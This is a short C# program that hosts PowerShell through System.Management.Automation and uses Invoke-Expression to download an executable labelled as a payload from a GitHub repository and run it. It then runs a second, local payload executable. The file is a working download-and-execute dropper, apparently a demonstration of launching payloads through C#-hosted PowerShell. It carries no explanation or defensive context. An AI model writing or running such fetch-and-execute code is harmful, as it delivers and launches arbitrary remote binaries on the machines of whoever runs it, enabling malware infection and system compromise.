using System;
using System.Management.Automation;
namespace Powershell
{
    class Program
    {
        static void Main(string[] args)
        {
            PowerShell ps = PowerShell.Create();
            ps.AddCommand("Invoke-Expression");
            ps.AddArgument("$url = 'https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/Csharp2Powershell/Csharp2PowershellOnlinePayload.exe';$output = 'Csharp2PowershellOnlinePayloadDownloaded.exe';wget $url -outfile $output;./Csharp2PowershellOnlinePayloadDownloaded.exe;");
            ps.Invoke();

            PowerShell ps1 = PowerShell.Create();
            ps1.AddCommand("Invoke-Expression");
            ps1.AddArgument("./Csharp2PowershellOfflinePayload.exe;");
            ps1.Invoke();
        }
    }
}